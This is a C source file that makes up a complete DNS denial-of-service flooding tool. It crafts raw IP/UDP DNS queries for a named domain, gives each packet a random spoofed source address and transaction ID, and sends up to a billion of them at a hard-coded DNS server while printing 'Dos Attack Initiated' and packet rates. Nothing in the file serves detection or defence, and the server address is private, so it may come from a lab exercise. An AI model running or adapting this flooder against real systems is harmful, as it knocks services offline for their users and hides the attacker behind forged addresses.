#include <stdio.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <assert.h>
#include <time.h>
#include <unistd.h>



const int BUFFER_LEN = 1024;
const char* DNS_SERVER = "192.168.0.105";
char* DOMAIN_NAME = "biis.buet.ac.bd";
const int DNS_PORT = 53;

const int N = 1e9;

struct dns_header {
  uint16_t xid;
  uint16_t flags;
  uint16_t qdcount;
  uint16_t ancount;
  uint16_t nscount;
  uint16_t arcount;
};

struct dns_question {
    char *name;
    uint16_t dnstype;
    uint16_t dnsclass;
};

void spoof_identity(struct iphdr *ip, struct dns_header *dns_h) {
	char ip_addr[20] ;
	sprintf(ip_addr, "%d.%d.%d.%d", rand() & 0xFF, rand() & 0xFF, rand() & 0xFF, rand() & 0xFF ) ;
	ip -> saddr = inet_addr(ip_addr);
	ip->id = htons(rand() & 0xFFFF);
	dns_h->xid= htons(rand()& 0xFFFF); 
}


void fill_ip(struct iphdr *ip) {
    ip->ihl      = 5;  // Header size = 5 * 32 bit
    ip->version  = 4;  // IPv4
    ip->tos      = 0; // low delay
    ip->id       = htons(rand() & 0xFFFF); // randomly assignning ip-id
    ip->ttl      = 64; // hops
    ip->protocol = 17; // UDP
    ip->daddr = inet_addr(DNS_SERVER);  // DNS ip
}

void fill_udp(struct udphdr *udp, size_t len) {
    udp->source = htons(10);        // source port
    udp->dest = htons(DNS_PORT);    // DNS port
    udp->len = htons(len);          // length of UDP header + DNS header + DNS question
}

void fill_sin(struct sockaddr_in *sin) {
    sin->sin_family = AF_INET;  // IP Address Family
    sin->sin_port = htons(DNS_PORT);
    sin->sin_addr.s_addr = inet_addr(DNS_SERVER);
}

void fill_dns_header(struct dns_header *dns_h) {
    dns_h->xid= htons(rand()& 0xFFFF);  // randomly assigning dns-id
    dns_h->flags = htons(0x0100);  // recursion desired
    dns_h->qdcount = htons (1);    // 1 question
    dns_h->ancount = 0;
    dns_h->nscount = 0;
    dns_h->arcount = 0;
};

char *build_domain_qname (char *hostname) {
	char *name = calloc(strlen (hostname) + 1, sizeof (char));  // 1 extra for the inital octet

	/* Leave the first byte blank for the first field length */
	memcpy(name + 1, hostname, strlen (hostname));
	int hostname_len = strlen(hostname);

	char count = 0;
	char *prev = name;

	for (int i = 0; i < hostname_len ; i++) {
		if (hostname[i] == '.') {
			*prev = count;
			prev = name + i + 1;
			count = 0;
		}
		else count++;
	}
	*prev = count;
	return name;
}

size_t fill_dns_question(char* buffer) {

    int len = 0;
    struct dns_question question;
    question.name = build_domain_qname(DOMAIN_NAME);
	question.dnstype = htons(1);   // QTYPE A records
	question.dnsclass = htons(1);  // QCLASS Internet Addresses

    memcpy(buffer, question.name, strlen(question.name) + 1);
    buffer += strlen(question.name) + 1 ;
    memcpy(buffer, &question.dnstype, sizeof (question.dnstype));
    buffer += sizeof(question.dnstype);
    memcpy (buffer, &question.dnsclass, sizeof (question.dnsclass));

	int ret_len = strlen(question.name) +  1 + sizeof(question.dnstype) + sizeof (question.dnsclass);
	free(question.name);
    return ret_len;
}


int main() {
    srand(time(0));
    char buffer[BUFFER_LEN];
    struct sockaddr_in sin;
    int yes = 1, pkt_sent = 0;
    size_t pos = 0;

    memset(buffer, 0, sizeof(buffer));

    struct iphdr *ip = (struct iphdr *) (buffer + pos);
    pos += sizeof(struct iphdr);

    struct udphdr *udp = (struct udphdr *) (buffer + pos) ;
    pos += sizeof(struct udphdr);

    struct dns_header *dns_h = (struct dns_header *) (buffer + pos);
    pos += sizeof(struct dns_header);


    int sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    if(sd < 0) {
        perror("socket() error");
        exit(2);
    }
	else printf("socket(): ok\n");

    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &yes, sizeof(yes)) < 0) {
        perror("setsockopt() error");
        exit(2);
    }
	else printf("setsockopt(): ok\n");


    fill_ip(ip);
    fill_dns_header(dns_h);
    size_t q_len = fill_dns_question(buffer + pos);
    fill_udp(udp, sizeof(struct udphdr) + sizeof(struct dns_header) + q_len );
    pos += q_len;
    fill_sin(&sin);


	printf("\nDos Attack Initiated.......\n\n");

	clock_t start = clock();

    for( ; pkt_sent < N ; pkt_sent++) {
		
		spoof_identity(ip, dns_h);

		if( sendto(sd, buffer, pos, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0 ) {
			perror("\nsendto() error");
			printf("\n");
			exit(2);
		}

		if(pkt_sent == 1e5) {
			double _tm = (double)(clock() - start) / CLOCKS_PER_SEC  ;
			printf("Packet frequency: %lf pkts/s\n", (1.0 * pkt_sent)/_tm );
		}
    }
	double _tm = (double)(clock() - start) / CLOCKS_PER_SEC  ;
	printf("Total time = %lf\n",_tm);
	printf("Total sent Packets = %d\n", pkt_sent);
	printf("Packet frequency: %lf pkts/s\n", (1.0 * pkt_sent)/_tm );
    return 0;
}